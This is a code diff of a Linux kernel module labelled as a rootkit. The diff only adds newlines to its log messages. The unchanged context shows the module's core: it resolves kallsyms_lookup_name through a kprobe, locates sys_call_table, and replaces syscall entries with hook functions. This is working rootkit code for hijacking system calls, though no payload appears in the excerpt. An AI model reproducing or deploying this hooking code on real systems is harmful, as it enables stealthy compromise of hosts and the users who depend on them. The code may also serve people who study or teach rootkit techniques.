@@ -54,19 +54,19 @@ int init_hooking(void)
     };
 
     if (lookup_name != NULL) {
-        pr_err("[ROOTKIT] Hooking module already initialized.");
+        pr_err("[ROOTKIT] Hooking module already initialized.\n");
         return -EALREADY;
     }
 
     i_err = register_kprobe(&probe);
     if (i_err) {
-        pr_err("[ROOTKIT] Failed to get kallsyms_lookup_name() address.");
+        pr_err("[ROOTKIT] Failed to get kallsyms_lookup_name() address.\n");
         return i_err;
     }
 
     // Function pointer type of kallsyms_lookup_name()
     lookup_name = (kallsyms_t)(probe.addr);
-    pr_info("[ROOTKIT] kallsym_lookup_name() address: %p", lookup_name);
+    pr_info("[ROOTKIT] kallsym_lookup_name() address: %p\n", lookup_name);
 
     // Cleanup kprobe as we don't need it anymore
     unregister_kprobe(&probe);
@@ -74,11 +74,11 @@ int init_hooking(void)
     // Find syscall table address
     p_syscall_table = lookup_name(SYS_CALL_TABLE_NAME);
     if (p_syscall_table == NULL) {
-        pr_err("[ROOTKIT] Failed to get sys_call_table address.");
+        pr_err("[ROOTKIT] Failed to get sys_call_table address.\n");
         return -ENOENT;
     }
 
-    pr_info("[ROOTKIT] Syscall table address: %p", p_syscall_table);
+    pr_info("[ROOTKIT] Syscall table address: %p\n", p_syscall_table);
 
     return 0;
 }
@@ -100,7 +100,7 @@ inline void set_syscall_entry(size_t sz_syscall_nr, sysfun_t new_sysfun)
 
 int hook_syscall(hook_t *p_hook)
 {
-    pr_info("[ROOTKIT] Hooking syscall %zu", p_hook->sz_syscall_nr);
+    pr_info("[ROOTKIT] Hooking syscall %zu\n", p_hook->sz_syscall_nr);
 
     *(p_hook->p_orig_sysfun) = get_syscall_entry(p_hook->sz_syscall_nr);
     set_syscall_entry(p_hook->sz_syscall_nr, p_hook->new_sysfun);
@@ -110,7 +110,7 @@ int hook_syscall(hook_t *p_hook)
 
 void unhook_syscall(const hook_t *p_hook)
 {
-    pr_info("[ROOTKIT] Unhooking syscall %zu", p_hook->sz_syscall_nr);
+    pr_info("[ROOTKIT] Unhooking syscall %zu\n", p_hook->sz_syscall_nr);
 
     set_syscall_entry(p_hook->sz_syscall_nr, *(p_hook->p_orig_sysfun));
 }
@@ -123,7 +123,7 @@ int hook_syscalls(hook_t p_hooks[], size_t sz_count)
     for (i = 0; i < sz_count; ++i) {
         i_err = hook_syscall(&p_hooks[i]);
         if (i_err) {
-            pr_err("[ROOTKIT] Failed to hook syscall %zu (n. %zu)", p_hooks[i].sz_syscall_nr, i);
+            pr_err("[ROOTKIT] Failed to hook syscall %zu (n. %zu)\n", p_hooks[i].sz_syscall_nr, i);
 
             // Rollback previous hooks before returning the error
             while (i > 0) {
